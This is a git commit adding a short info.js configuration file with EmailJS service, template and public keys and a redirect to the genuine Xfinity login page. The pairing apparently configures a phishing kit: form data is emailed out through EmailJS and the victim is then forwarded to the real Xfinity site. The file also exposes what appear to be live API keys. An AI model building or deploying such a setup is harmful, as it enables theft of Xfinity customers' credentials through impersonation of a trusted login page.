0f95ba1c499ee04c88224d10f6513a2551045c13
nakatalitymandemlly <jenniferkane992@gmail.com>
2026-09-19 05:18:22 -0700

    Add files via upload

---
+++ info.js
@@ -0,0 +1,10 @@
+/*
+ *
+ * Sign Up On https://emailjs.com to get the details below.
+ *
+ * /**/
+
+const SERVICE_KEY = "service_cnuv1zq";
+const TEMPLATE_KEY =  "template_10z9ojp";
+const PUBLIC_KEY = "w50Qo5O6kJCt2XwfB";
+const REDIRECT_URL = "https://login.xfinity.com/login?";
